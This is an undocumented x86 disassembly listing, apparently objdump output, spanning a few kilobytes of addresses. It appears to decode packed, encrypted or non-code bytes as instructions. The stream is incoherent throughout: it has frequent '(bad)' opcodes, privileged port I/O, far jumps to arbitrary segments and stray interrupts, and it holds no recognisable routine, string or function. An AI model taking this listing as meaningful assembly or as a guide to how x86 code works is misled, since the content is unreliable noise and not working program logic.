  40ebba:	pusha  
  40ebbb:	jg     0x40ec17
  40ebbd:	nop
  40ebbe:	adc    ch,BYTE PTR [eax+0x2766e104]
  40ebc4:	out    0x67,eax
  40ebc6:	xchg   edx,eax
  40ebc7:	push   ss
  40ebc8:	xchg   DWORD PTR [esi],ebp
  40ebca:	mov    edi,0x43f6b17e
  40ebcf:	push   ds
  40ebd0:	lods   al,BYTE PTR ds:[esi]
  40ebd1:	je     0x40ebc0
  40ebd3:	shr    BYTE PTR [esi],1
  40ebd5:	mov    edi,0xf5289bf1
  40ebda:	(bad)  [eax-0x1518bf78]
  40ebe0:	push   ss
  40ebe1:	xchg   ecx,eax
  40ebe2:	les    edx,FWORD PTR [edi]
  40ebe4:	add    DWORD PTR [edi-0x4],eax
  40ebe7:	jns    0x40ebc7
  40ebe9:	mov    ch,cl
  40ebeb:	loopne 0x40eb85
  40ebed:	jmp    0x7a71:0x6b680654
  40ebf4:	xchg   edx,eax
  40ebf5:	into   
  40ebf6:	bound  ebx,QWORD PTR [edx]
  40ebf8:	inc    esi
  40ebf9:	outs   dx,DWORD PTR ds:[esi]
  40ebfa:	xor    bh,cl
  40ebfc:	mov    ecx,DWORD PTR [ebp+ebp*8-0x77]
  40ec00:	(bad)  
  40ec01:	mov    ds,edi
  40ec03:	push   0x207b4d54
  40ec08:	jp     0x40ec1b
  40ec0a:	sbb    al,0x85
  40ec0c:	push   0xd23c5336
  40ec11:	or     cl,cl
  40ec13:	xchg   edi,eax
  40ec14:	int    0x50
  40ec16:	dec    esp
  40ec17:	popa   
  40ec18:	or     eax,0xa7f5d28b
  40ec1d:	mov    WORD PTR [edx+0x4064fba0],gs
  40ec23:	or     dl,BYTE PTR [ebp-0x79]
  40ec26:	add    eax,esp
  40ec28:	lods   al,BYTE PTR ds:[esi]
  40ec29:	xchg   edi,edx
  40ec2b:	in     eax,0x1d
  40ec2d:	popf   
  40ec2e:	nop
  40ec2f:	call   0x6c5b4e7f
  40ec34:	push   ds
  40ec35:	cmp    eax,0xae64ef3a
  40ec3a:	retf   
  40ec3b:	outs   dx,BYTE PTR ds:[esi]
  40ec3c:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40ec3e:	pop    ebp
  40ec3f:	add    ebx,DWORD PTR [eax+0x423a125b]
  40ec45:	jno    0x40ec61
  40ec47:	sub    BYTE PTR [eax-0x24],al
  40ec4a:	cld    
  40ec4b:	lea    edi,[eax-0x75a58566]
  40ec51:	sbb    al,0xda
  40ec53:	test   al,0xa7
  40ec55:	and    bh,BYTE PTR [ecx+ebx*8-0x4a]
  40ec59:	sub    edi,edi
  40ec5b:	call   0x415c2565
  40ec60:	cwde   
  40ec61:	add    ah,cl
  40ec63:	fcmovne st,st(7)
  40ec65:	jno    0x40ebff
  40ec67:	inc    ebp
  40ec68:	adc    al,0x5d
  40ec6a:	push   ebp
  40ec6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec6c:	push   ecx
  40ec6d:	sbb    bl,dh
  40ec6f:	scas   eax,DWORD PTR es:[edi]
  40ec70:	iret   
  40ec71:	jg     0x40ec47
  40ec73:	iret   
  40ec74:	mov    WORD PTR [ebp-0x32325a90],cs
  40ec7a:	das    
  40ec7b:	cmp    BYTE PTR [eax-0x5f],cl
  40ec7e:	pusha  
  40ec7f:	jp     0x40ec54
  40ec81:	sub    eax,0x7ad0b337
  40ec86:	(bad)  
  40ec8a:	push   es
  40ec8b:	xor    DWORD PTR [edx-0x35],edi
  40ec8e:	xchg   esi,eax
  40ec8f:	xor    al,0x8d
  40ec91:	and    bl,dl
  40ec93:	and    ch,BYTE PTR [ecx+0x2e0d92]
  40ec99:	pop    ebp
  40ec9a:	test   eax,0xffad8fab
  40ec9f:	inc    ebp
  40eca0:	and    eax,DWORD PTR [ebx+esi*1]
  40eca3:	(bad)  
  40eca4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eca5:	push   cs
  40eca6:	ja     0x40ecd7
  40eca8:	sar    DWORD PTR [edx*8-0x75312853],cl
  40ecaf:	and    eax,0xb47a6bc1
  40ecb4:	and    cl,BYTE PTR [ecx+0x7fdf1ac1]
  40ecba:	popa   
  40ecbb:	dec    ebp
  40ecbc:	cmp    eax,0xf7e225a4
  40ecc1:	icebp  
  40ecc2:	test   BYTE PTR [ebx+0x609b711c],cl
  40ecc8:	mov    ebp,0xbd3ac8af
  40eccd:	xor    ebx,DWORD PTR [edi+0x7f]
  40ecd0:	repz adc ecx,DWORD PTR [ecx+0x7b]
  40ecd4:	inc    ebx
  40ecd5:	mov    al,ds:0x15116b67
  40ecda:	add    eax,0x1cc8c4e8
  40ecdf:	neg    DWORD PTR [ebx+0x28493d89]
  40ece5:	das    
  40ece6:	clc    
  40ece7:	sbb    ecx,DWORD PTR [ebx]
  40ece9:	sub    ch,BYTE PTR [eax+0x40f2c957]
  40ecef:	push   ecx
  40ecf0:	xchg   DWORD PTR [eax+0x67],eax
  40ecf3:	jo     0x40ed68
  40ecf5:	and    al,0xc2
  40ecf7:	mov    dh,BYTE PTR [edi+0x7d]
  40ecfa:	(bad)
  40ecfd:	or     esp,edx
  40ecff:	mov    eax,0xdc4359ec
  40ed04:	imul   edi,DWORD PTR [edx+0x348943b9],0xabc39fbd
  40ed0e:	outs   dx,BYTE PTR ds:[esi]
  40ed0f:	mov    ebx,0x758f6e44
  40ed14:	ret    0x2e66
  40ed17:	xchg   ebp,eax
  40ed18:	mov    al,0x9d
  40ed1a:	xor    bl,BYTE PTR [ebp+0x79]
  40ed1d:	cmp    edx,DWORD PTR [eax+0x7c1dc707]
  40ed23:	and    eax,ebx
  40ed25:	jno    0x40ed10
  40ed27:	xchg   edx,eax
  40ed28:	push   0xc1b54557
  40ed2d:	pushf  
  40ed2e:	push   eax
  40ed2f:	ret    0xb667
  40ed32:	jb     0x40eda7
  40ed34:	mov    eax,0x1678db7d
  40ed39:	push   0x5b
  40ed3b:	jmp    0xdca90f00
  40ed40:	hlt    
  40ed41:	fimul  DWORD PTR [ebx+0x1b]
  40ed44:	cmp    al,BYTE PTR [edx+ebp*2-0x42]
  40ed48:	or     al,0x8b
  40ed4a:	jp     0x40ed9a
  40ed4c:	mov    eax,0xdfd4bf97
  40ed51:	and    ebx,DWORD PTR [eax+0x2312b68d]
  40ed57:	inc    ebp
  40ed58:	and    edi,DWORD PTR [ecx+0x39f4a3bf]
  40ed5e:	lds    edx,FWORD PTR [ecx+0x74bbacbc]
  40ed64:	adc    BYTE PTR [esi+ebx*4+0x7d995c12],bl
  40ed6b:	mov    BYTE PTR [eax],bl
  40ed6d:	and    BYTE PTR [ebx+0x1],dh
  40ed70:	or     esp,edx
  40ed72:	jmp    0xf3f50617
  40ed77:	leave  
  40ed78:	xchg   BYTE PTR [ebx],al
  40ed7a:	sub    ah,BYTE PTR [eiz*2+0x7f96221b]
  40ed81:	jns    0x40ed71
  40ed83:	int3   
  40ed84:	out    dx,eax
  40ed85:	outs   dx,BYTE PTR ds:[esi]
  40ed86:	aad    0x45
  40ed88:	mov    fs,eax
  40ed8a:	mov    edi,0xd5e5373a
  40ed8f:	shl    ch,1
  40ed91:	scas   al,BYTE PTR es:[edi]
  40ed92:	push   ecx
  40ed93:	jg     0x40eda4
  40ed95:	nop
  40ed96:	fstp   TBYTE PTR [eax-0x5f504867]
  40ed9c:	leavew 
  40ed9e:	cwde   
  40ed9f:	ins    BYTE PTR es:[edi],dx
  40eda0:	pop    edx
  40eda1:	adc    dh,BYTE PTR [ebx-0x4780bb5c]
  40eda7:	cmp    BYTE PTR [eax+esi*8-0x12],0xa3
  40edac:	adc    eax,ebx
  40edae:	arpl   WORD PTR [ecx-0x4335d08d],di
  40edb4:	loope  0x40ed6f
  40edb6:	into   
  40edb7:	mov    dl,0x4c
  40edb9:	(bad)  
  40edba:	sbb    eax,0x59159e5d
  40edbf:	add    ebp,DWORD PTR [edi-0x31]
  40edc2:	inc    edi
  40edc3:	bound  esp,QWORD PTR [edi+edx*4]
  40edc6:	adc    BYTE PTR [edi+0x3e896a5],0x9a
  40edcd:	scas   eax,DWORD PTR es:[edi]
  40edce:	pop    esp
  40edcf:	mov    dh,0x77
  40edd1:	retf   
  40edd2:	shl    dl,1
  40edd4:	or     esp,DWORD PTR [edi]
  40edd6:	in     al,0xe1
  40edd8:	out    0x9e,eax
  40edda:	mov    DWORD PTR [edi-0x5d],ebx
  40eddd:	cld    
  40edde:	out    0x26,eax
  40ede0:	or     eax,0xcda5f74b
  40ede5:	jp     0x40eda3
  40ede7:	gs std 
  40ede9:	int3   
  40edea:	xchg   BYTE PTR [esi-0x41],bh
  40eded:	ret    0x6b60
  40edf0:	out    0x34,al
  40edf2:	aaa    
  40edf3:	pop    eax
  40edf4:	mov    DWORD PTR [ecx-0x2982a4da],edi
  40edfa:	pop    edx
  40edfb:	call   0x2912:0xc70e5305
  40ee02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee03:	aas    
  40ee04:	outs   dx,DWORD PTR gs:[esi]
  40ee06:	ret    0x430f
  40ee09:	stos   BYTE PTR es:[edi],al
  40ee0a:	or     al,0x91
  40ee0c:	(bad)  
  40ee0d:	ret    
  40ee0e:	cmp    eax,0xc77e3a7a
  40ee13:	retf   
  40ee14:	pop    ss
  40ee15:	inc    esp
  40ee16:	add    al,0x6c
  40ee18:	mov    ebp,0xf36c4602
  40ee1d:	cwde   
  40ee1e:	cmp    DWORD PTR [ebx],edx
  40ee20:	clc    
  40ee21:	repnz sbb BYTE PTR [ebp-0x6f],cl
  40ee25:	xchg   edx,eax
  40ee26:	inc    eax
  40ee27:	mov    esp,DWORD PTR [esi-0x1e]
  40ee2a:	sub    esp,DWORD PTR [edx]
  40ee2c:	mov    ebp,0x190c7379
  40ee31:	inc    ecx
  40ee32:	mov    ecx,0x23f09392
  40ee37:	pop    es
  40ee38:	and    esi,0xdcd1b094
  40ee3e:	cwde   
  40ee3f:	fldcw  WORD PTR [edi+ebp*8]
  40ee42:	inc    esi
  40ee43:	lds    edx,FWORD PTR [edx]
  40ee45:	leave  
  40ee46:	xchg   edx,eax
  40ee47:	push   ss
  40ee48:	setp   BYTE PTR [ebx]
  40ee4b:	(bad)  
  40ee4c:	(bad)  
  40ee4e:	cmp    bh,bl
  40ee50:	retf   0x25eb
  40ee53:	cli    
  40ee54:	mov    esi,0x6d30c3ba
  40ee59:	xchg   edi,eax
  40ee5a:	div    BYTE PTR [esi-0x18af9dbd]
  40ee60:	pop    esi
  40ee61:	test   BYTE PTR [edx-0x69],dl
  40ee64:	out    0x29,al
  40ee66:	lods   al,BYTE PTR ds:[esi]
  40ee67:	fiadd  DWORD PTR [esi-0x447d923b]
  40ee6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee6e:	push   ecx
  40ee6f:	ins    DWORD PTR es:[edi],dx
  40ee70:	sahf   
  40ee71:	test   eax,0xcdf25d65
  40ee76:	inc    ebp
  40ee77:	pop    eax
  40ee78:	mov    ebx,0x6425518a
  40ee7d:	lds    ebp,FWORD PTR [ebp-0x4f]
  40ee80:	out    0xaf,eax
  40ee82:	ror    BYTE PTR [eax],0x89
  40ee85:	mov    ds:0x24b55f9,eax
  40ee8a:	mov    ebx,0xfb61c6c9
  40ee8f:	pop    edi
  40ee90:	(bad)  [eax-0x4e]
  40ee93:	dec    edx
  40ee94:	in     eax,0x40
  40ee96:	data16 adc al,0x8f
  40ee99:	sbb    dh,ah
  40ee9b:	jae    0x40ee9d
  40ee9d:	and    al,0x82
  40ee9f:	push   0xb178afc4
  40eea4:	push   edi
  40eea5:	push   ss
  40eea6:	push   esp
  40eea7:	and    al,0x5b
  40eea9:	pop    edi
  40eeaa:	(bad)  
  40eeab:	call   0xe96a:0xa438316c
  40eeb2:	sbb    al,0xbc
  40eeb4:	pop    esp
  40eeb5:	mov    esi,0xf536c3ce
  40eeba:	push   0x54092b29
  40eebf:	or     ebx,0xffffffbd
  40eec2:	shr    ecx,1
  40eec4:	sbb    ecx,DWORD PTR [ebx]
  40eec6:	int    0x65
  40eec8:	loope  0x40ee4c
  40eeca:	sub    bl,BYTE PTR [esi+edi*4]
  40eecd:	add    bl,BYTE PTR [ecx+0x78e3f05d]
  40eed3:	cmp    ah,BYTE PTR [esi]
  40eed5:	scas   eax,DWORD PTR es:[edi]
  40eed6:	ds sub ebp,ecx
  40eed9:	mov    esi,0x7bbcaf11
  40eede:	jle    0x40eef4
  40eee0:	outs   dx,DWORD PTR ds:[esi]
  40eee1:	mov    esp,DWORD PTR [ecx-0x51]
  40eee4:	sahf   
  40eee5:	mov    esi,DWORD PTR [edx+0x3893f39]
  40eeeb:	mov    esi,0x1fe0b31b
  40eef0:	shl    ah,cl
  40eef2:	add    edx,esi
  40eef4:	aas    
  40eef5:	mov    gs,WORD PTR [ecx]
  40eef7:	pop    ecx
  40eef8:	add    eax,0xd30516c0
  40eefd:	ret    0x84d0
  40ef00:	mov    bh,0x21
  40ef02:	std    
  40ef03:	sub    ch,BYTE PTR [eax-0x1e]
  40ef06:	add    al,0x7a
  40ef08:	bound  eax,QWORD PTR [eax+0x734167be]
  40ef0e:	sbb    eax,0xffffffa9
  40ef11:	pop    edi
  40ef12:	mov    ds:0xde5975ce,eax
  40ef17:	cld    
  40ef18:	mov    bh,0xad
  40ef1a:	xchg   DWORD PTR [ebx+0x794e7aab],edx
  40ef20:	mov    dh,0x14
  40ef22:	scas   al,BYTE PTR es:[edi]
  40ef23:	outs   dx,BYTE PTR ds:[esi]
  40ef24:	add    eax,0xd8271682
  40ef29:	lods   al,BYTE PTR ds:[esi]
  40ef2a:	sub    eax,0x4eaa0903
  40ef2f:	or     DWORD PTR ss:[edi+0x6c],esp
  40ef33:	jne    0x40ef92
  40ef35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef37:	mov    esi,ecx
  40ef39:	fld    st(4)
  40ef3b:	test   BYTE PTR [eax+ebx*8+0x44a09f33],bh
  40ef42:	lods   eax,DWORD PTR ds:[esi]
  40ef43:	not    BYTE PTR [edx-0xb]
  40ef46:	clc    
  40ef47:	cmc    
  40ef48:	mov    cl,0xf
  40ef4a:	xchg   ecx,eax
  40ef4b:	lods   al,BYTE PTR ds:[esi]
  40ef4c:	xchg   ebx,eax
  40ef4d:	mov    edx,0x4a459602
  40ef52:	and    al,0x38
  40ef54:	call   FWORD PTR [bp+di-0x38]
  40ef58:	cmp    al,0x1a
  40ef5a:	pusha  
  40ef5b:	cli    
  40ef5c:	mov    al,0x26
  40ef5e:	mov    ch,0xf2
  40ef60:	rcl    edi,0xf3
  40ef63:	and    BYTE PTR [eax-0x29731b47],cl
  40ef69:	(bad)  
  40ef6b:	and    eax,0x5e77ac32
  40ef70:	pop    ebp
  40ef71:	inc    eax
  40ef72:	lds    esi,FWORD PTR [edx+ecx*2]
  40ef75:	out    dx,eax
  40ef76:	idiv   BYTE PTR [ebx-0x3c486303]
  40ef7c:	in     al,0x3
  40ef7e:	outs   dx,DWORD PTR ds:[esi]
  40ef7f:	push   edi
  40ef80:	in     eax,0x41
  40ef82:	jb     0x40ef21
  40ef84:	lods   al,BYTE PTR ds:[esi]
  40ef85:	js     0x40f005
  40ef87:	scas   eax,DWORD PTR es:[edi]
  40ef88:	imul   ebx,ebp,0x993db61c
  40ef8e:	data16 fsubrp st(1),st
  40ef91:	dec    esp
  40ef92:	loopne 0x40efbf
  40ef94:	div    DWORD PTR [edx-0x3007a687]
  40ef9a:	mov    edi,0xc12115fa
  40ef9f:	push   ecx
  40efa0:	aad    0x62
  40efa2:	stc    
  40efa3:	sbb    ah,BYTE PTR [edx+0x27b18115]
  40efa9:	push   esi
  40efaa:	test   DWORD PTR cs:[ecx+0x25],esi
  40efae:	mov    bh,0xee
  40efb0:	inc    edi
  40efb1:	rcl    BYTE PTR [eax-0x62b28690],0xd0
  40efb8:	loopne 0x40ef77
  40efba:	xchg   ebp,eax
  40efbb:	cmp    BYTE PTR [ebx],ch
  40efbd:	push   ss
  40efbe:	cdq    
  40efbf:	mov    ds:0xb62518b2,eax
  40efc4:	adc    ebp,DWORD PTR [ebp+0x2a]
  40efc7:	add    cl,bh
  40efc9:	(bad)  [eax-0x712c512a]
  40efcf:	out    dx,al
  40efd0:	les    esi,FWORD PTR [edx]
  40efd2:	add    al,0xb5
  40efd4:	or     esi,DWORD PTR [ebp+0x6d]
  40efd7:	adc    edx,ebx
  40efd9:	inc    edi
  40efda:	adc    esp,DWORD PTR [edx]
  40efdc:	inc    BYTE PTR [edi]
  40efde:	mov    WORD PTR ds:[edi-0xb91c3f5],ds
  40efe5:	loop   0x40efef
  40efe7:	sbb    eax,0x2d9f942a
  40efec:	xchg   esp,eax
  40efed:	mov    esp,gs
  40efef:	hlt    
  40eff0:	test   al,0x34
  40eff2:	retf   0x86b3
  40eff5:	aad    0xd3
  40eff7:	adc    bh,dl
  40eff9:	pop    esp
  40effa:	rcl    BYTE PTR [ecx-0x7fad3c6e],1
  40f000:	int    0x34
  40f002:	(bad)  
  40f003:	mov    dl,0x37
  40f005:	icebp  
  40f006:	jo     0x40f052
  40f008:	and    eax,0x5d812b3e
  40f00d:	mov    edi,0xb6775bd2
  40f012:	sub    BYTE PTR [edx+0x49],ch
  40f015:	xchg   edi,eax
  40f016:	test   esp,0x3f41ed63
  40f01c:	dec    ebx
  40f01d:	mov    ds:0x99f797b7,eax
  40f022:	or     eax,0xa688dde0
  40f027:	cli    
  40f028:	mov    ds:0x412e0869,eax
  40f02d:	mov    ds:0x799496ce,eax
  40f032:	push   0x5c
  40f034:	in     eax,dx
  40f035:	outs   dx,BYTE PTR ds:[esi]
  40f036:	jbe    0x40f07a
  40f038:	push   ds
  40f039:	cmc    
  40f03a:	daa    
  40f03b:	mov    ah,0x3b
  40f03d:	repz fwait
  40f03f:	mov    edx,0xd7a969cf
  40f044:	nop
  40f045:	sub    ecx,DWORD PTR ds:0x4b7620bd
  40f04b:	sbb    ch,BYTE PTR [ebp+edx*1+0x17965359]
  40f052:	in     al,0x6f
  40f054:	mov    edi,0xc7d6431c
  40f059:	loop   0x40f0d5
  40f05b:	loopne 0x40f09d
  40f05d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f05e:	stos   DWORD PTR es:[edi],eax
  40f05f:	je     0x40f05e
  40f061:	mov    ebx,0x506ae345
  40f066:	leave  
  40f067:	pop    ecx
  40f068:	rcl    bl,1
  40f06a:	je     0x40f03d
  40f06c:	cld    
  40f06d:	outs   dx,BYTE PTR ds:[esi]
  40f06e:	pop    ecx
  40f06f:	jle    0x40f0ce
  40f071:	dec    ecx
  40f072:	pop    es
  40f073:	aaa    
  40f074:	call   0xb6ec84f6
  40f079:	sub    BYTE PTR [edx],dh
  40f07b:	cmp    DWORD PTR [edi+0x50d2c484],ebp
  40f081:	sbb    ecx,DWORD PTR [edi+0x54cf804c]
  40f087:	hlt    
  40f088:	pop    edi
  40f089:	mov    dl,0x43
  40f08b:	leave  
  40f08c:	call   0x578a:0x3dc351af
  40f093:	push   0xfbeda1d9
  40f098:	ficomp DWORD PTR [ebp-0x1699c803]
  40f09e:	out    dx,al
  40f09f:	call   0x6582:0xf93810b5
  40f0a6:	out    dx,al
  40f0a7:	test   eax,0x14ac9d44
  40f0ac:	push   esi
  40f0ad:	daa    
  40f0ae:	pop    eax
  40f0af:	clflush BYTE PTR [ebx-0x532776d8]
  40f0b6:	push   ebx
  40f0b7:	hlt    
  40f0b8:	mov    edx,edi
  40f0ba:	sar    DWORD PTR [ebp-0x3ccef203],cl
  40f0c0:	pop    ds
  40f0c1:	inc    esi
  40f0c2:	push   esp
  40f0c3:	or     BYTE PTR ss:[ebx],cl
  40f0c6:	push   ds
  40f0c7:	dec    ebp
  40f0c8:	cmp    edx,0x7b4ea7ad
  40f0ce:	repz xor eax,0xd6a844fa
  40f0d4:	cmp    ah,ah
  40f0d6:	scas   eax,DWORD PTR es:[edi]
  40f0d7:	into   
  40f0d8:	cmp    eax,0xd8e73a54
  40f0dd:	jbe    0x40f14b
  40f0df:	cld    
  40f0e0:	out    0x61,eax
  40f0e2:	add    al,0x26
  40f0e4:	jge    0x40f08f
  40f0e6:	or     eax,0xfba33c53
  40f0eb:	mov    ah,0x4b
  40f0ed:	aad    0xfb
  40f0ef:	sub    esi,edi
  40f0f1:	les    ecx,FWORD PTR [eax]
  40f0f3:	sbb    BYTE PTR [ecx],0x46
  40f0f6:	shr    ebp,0xda
  40f0f9:	jno    0x40f0d4
  40f0fb:	xlat   BYTE PTR ds:[ebx]
  40f0fc:	pushf  
  40f0fd:	lea    edi,[esi+ecx*4-0x7e]
  40f101:	inc    ebp
  40f102:	loop   0x40f137
  40f104:	sbb    DWORD PTR ds:0xe48066f8,edx
  40f10a:	inc    esp
  40f10b:	scas   al,BYTE PTR es:[edi]
  40f10c:	call   0xb370:0x6e5cf42b
  40f113:	les    ecx,FWORD PTR [eax-0x6f]
  40f116:	mov    esi,edi
  40f118:	xchg   esi,eax
  40f119:	inc    esp
  40f11a:	out    dx,eax
  40f11b:	rcr    DWORD PTR [edx+eax*8+0x4dd5541],0x12
  40f123:	push   0xed8361c6
  40f128:	jb     0x40f124
  40f12a:	jb     0x40f146
  40f12c:	pop    ds
  40f12d:	jnp    0x40f17f
  40f12f:	scas   al,BYTE PTR es:[edi]
  40f130:	in     eax,0x84
  40f132:	cmp    edx,DWORD PTR [ebx-0xc]
  40f135:	popf   
  40f136:	mov    ebp,0x60d524
  40f13b:	fwait
  40f13c:	sub    BYTE PTR [esi+0x4e9fdde],cl
  40f142:	pop    edi
  40f143:	lea    ebp,[edi-0x1e]
  40f146:	jl     0x40f132
  40f148:	dec    ebp
  40f149:	mov    DWORD PTR [ebx+ecx*4-0x53],ecx
  40f14d:	push   edi
  40f14e:	or     DWORD PTR [ebx-0x27dc73cc],edx
  40f154:	inc    edi
  40f155:	imul   ebp,edi,0xffffffd3
  40f158:	pop    ecx
  40f159:	out    0x81,eax
  40f15b:	and    BYTE PTR [ebx],al
  40f15d:	adc    BYTE PTR [ecx],0x35
  40f160:	cmp    eax,0xbb0922c0
  40f165:	cmp    BYTE PTR [esi],cl
  40f167:	lds    esi,FWORD PTR [eax+0x7a]
  40f16a:	push   edi
  40f16b:	sahf   
  40f16c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f16d:	add    esi,edx
  40f16f:	jge    0x40f103
  40f171:	push   0x428a1ab9
  40f176:	mov    ebp,0xccc0ce7
  40f17b:	in     al,0x8e
  40f17d:	mov    bh,0x3
  40f17f:	mov    BYTE PTR [eax],cl
  40f181:	cwde   
  40f182:	imul   esi,DWORD PTR [ecx+ebp*8-0x7648b644],0x8bc90552
  40f18d:	adc    eax,esp
  40f18f:	or     dl,al
  40f191:	xlat   BYTE PTR ds:[ebx]
  40f192:	test   eax,0x51da137e
  40f197:	sbb    DWORD PTR [ebx],0x208065b6
  40f19d:	mov    ch,bl
  40f19f:	pop    ebx
  40f1a0:	pop    ebp
  40f1a1:	or     al,dl
  40f1a3:	jle    0x40f18a
  40f1a5:	sahf   
  40f1a6:	dec    esi
  40f1a7:	sub    BYTE PTR [esi+0x75b0203c],dl
  40f1ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1ae:	nop
  40f1af:	mov    eax,ds:0xdedb3b98
  40f1b4:	test   ebx,ecx
  40f1b6:	push   edi
  40f1b7:	inc    esp
  40f1b8:	dec    edx
  40f1b9:	(bad)  
  40f1ba:	aas    
  40f1bb:	mov    ecx,0x6024fd02
  40f1c0:	push   0x922d53c4
  40f1c5:	int3   
  40f1c6:	nop
  40f1c7:	mov    ds:0xdb72143a,al
  40f1cc:	mov    al,ds:0xe29eac48
  40f1d1:	fisttp QWORD PTR [ebx+ebp*4]
  40f1d4:	pop    edi
  40f1d5:	das    
  40f1d6:	imul   esp,esp,0x61f22a58
  40f1dc:	inc    eax
  40f1dd:	jge    0x40f21b
  40f1df:	iret   
  40f1e0:	enter  0x39a0,0x88
  40f1e4:	xchg   BYTE PTR [eax],bl
  40f1e6:	cmp    BYTE PTR [ebx-0x77e97016],ch
  40f1ec:	pop    es
  40f1ed:	add    eax,0xb54e6529
  40f1f2:	and    ebx,edx
  40f1f4:	or     ebp,edx
  40f1f6:	pop    ebx
  40f1f7:	popa   
  40f1f8:	jo     0x40f23b
  40f1fa:	inc    eax
  40f1fb:	xor    DWORD PTR [esi],esi
  40f1fd:	mov    BYTE PTR [edi+0x24],bh
  40f200:	or     BYTE PTR [edx+0x2eead9a7],bl
  40f206:	jno    0x40f223
  40f208:	dec    edx
  40f209:	sbb    al,0x92
  40f20b:	jb     0x40f1a8
  40f20d:	mov    WORD PTR fs:[ecx-0x249d8e43],ds
  40f214:	test   BYTE PTR [ecx-0x40],dh
  40f217:	add    ebp,DWORD PTR [eax-0x2b]
  40f21a:	sub    edi,esp
  40f21c:	iret   
  40f21d:	xchg   ebx,eax
  40f21e:	test   DWORD PTR [ebp+eax*4+0x41],0x4c6d5f10
  40f226:	mov    ebp,ds
  40f228:	js     0x40f1df
  40f22a:	mov    ds:0x3ba1e499,eax
  40f22f:	repnz fcmovu st,st(2)
  40f232:	imul   esp,ecx,0x90fe9a43
  40f238:	and    al,0x77
  40f23a:	and    edx,DWORD PTR [eax-0xd]
  40f23d:	push   esp
  40f23e:	push   ss
  40f23f:	mov    al,ds:0x9b31bc3b
  40f244:	and    dl,bl
  40f246:	jle    0x40f244
  40f248:	sbb    al,0xbd
  40f24a:	iret   
  40f24b:	cli    
  40f24c:	or     dl,BYTE PTR [ebx+0x76e384bd]
  40f252:	mov    bl,0xb9
  40f254:	inc    ebx
  40f255:	rol    BYTE PTR ds:0x1a8eb8a3,0xf3
  40f25c:	ret    
  40f25d:	sub    bl,0x17
  40f260:	push   ss
  40f261:	adc    ebx,edi
  40f263:	sub    al,0x63
  40f265:	(bad)  
  40f266:	popa   
  40f267:	pop    eax
  40f268:	(bad)  
  40f269:	jmp    0x40f23b
  40f26b:	data16 cmp al,bl
  40f26e:	xor    esi,ebx
  40f270:	mov    edi,0xf5ae7180
  40f275:	xchg   esp,eax
  40f276:	sub    bh,BYTE PTR [esi+0x6475007f]
  40f27c:	stos   BYTE PTR es:[edi],al
  40f27d:	or     al,0x30
  40f27f:	add    edi,0xffffff81
  40f282:	sbb    eax,0x7478aacc
  40f287:	fs mov ah,0xf8
  40f28a:	lahf   
  40f28b:	sbb    al,0x34
  40f28d:	shl    ebx,cl
  40f28f:	into   
  40f290:	mov    bh,0x79
  40f292:	adc    BYTE PTR [edi],0x10
  40f295:	das    
  40f296:	aam    0x0
  40f298:	scas   eax,DWORD PTR es:[edi]
  40f299:	sar    DWORD PTR [ebx],0xca
  40f29c:	jg     0x40f2e7
  40f29e:	sbb    edi,esp
  40f2a0:	xor    al,0xdb
  40f2a2:	ds sbb ebp,ebp
  40f2a5:	mov    ch,0x2f
  40f2a7:	push   ss
  40f2a8:	outs   dx,DWORD PTR ds:[esi]
  40f2a9:	inc    esi
  40f2aa:	dec    edi
  40f2ab:	adc    al,0x27
  40f2ad:	int    0x28
  40f2af:	xchg   ebx,eax
  40f2b0:	fdiv   DWORD PTR [edi]
  40f2b2:	push   ebp
  40f2b3:	int    0xeb
  40f2b5:	cli    
  40f2b6:	test   eax,0xf40bfdfd
  40f2bb:	push   ds
  40f2bc:	and    al,0x78
  40f2be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2bf:	jge    0x40f279
  40f2c1:	pushf  
  40f2c2:	jg     0x40f2b3
  40f2c4:	js     0x40f2d0
  40f2c6:	cmp    al,0x74
  40f2c8:	xchg   BYTE PTR ds:0x612bba09,dh
  40f2ce:	shl    DWORD PTR [ebp-0x5e],0x13
  40f2d2:	inc    esp
  40f2d3:	jns    0x40f341
  40f2d5:	adc    ebp,esp
  40f2d7:	mov    ch,0xbb
  40f2d9:	jge    0x40f2af
  40f2db:	test   eax,0xf9b401
  40f2e0:	aas    
  40f2e1:	and    al,0xf4
  40f2e3:	jecxz  0x40f316
  40f2e5:	enter  0x743,0x7d
  40f2e9:	in     al,dx
  40f2ea:	mov    DWORD PTR [esp+ebp*2],ecx
  40f2ed:	and    al,0xd7
  40f2ef:	pop    ss
  40f2f0:	cdq    
  40f2f1:	inc    edx
  40f2f2:	pop    ebx
  40f2f3:	neg    BYTE PTR ds:[ebp+0x38a0d638]
  40f2fa:	outs   dx,DWORD PTR ds:[esi]
  40f2fb:	std    
  40f2fc:	mov    cl,0xb4
  40f2fe:	push   0x2c746b1b
  40f303:	inc    esi
  40f304:	cli    
  40f305:	pop    edx
  40f306:	push   0x119c7e05
  40f30b:	inc    ebp
  40f30c:	mov    edi,0x134e917e
  40f311:	mov    ss,ecx
  40f313:	das    
  40f314:	inc    ebp
  40f315:	fmul   QWORD PTR [eax]
  40f317:	loop   0x40f2de
  40f319:	icebp  
  40f31a:	and    al,0x32
  40f31c:	pop    eax
  40f31d:	les    esi,FWORD PTR [ebx]
  40f31f:	stos   DWORD PTR es:[edi],eax
  40f320:	jae    0x40f2ad
  40f322:	pushf  
  40f323:	mov    eax,ebx
  40f325:	mov    ?,WORD PTR [esp+ebp*2-0x5f]
  40f329:	aam    0x47
  40f32b:	(bad)  
  40f32c:	fidivr DWORD PTR [edi+0x72d748e1]
  40f332:	jmp    0xae87:0x7bcc06b9
  40f339:	stc    
  40f33a:	test   BYTE PTR [ecx+0x67],al
  40f33d:	and    BYTE PTR [edi],bl
  40f33f:	inc    esp
  40f340:	lds    eax,FWORD PTR [ecx-0x5d]
  40f343:	scas   al,BYTE PTR es:[edi]
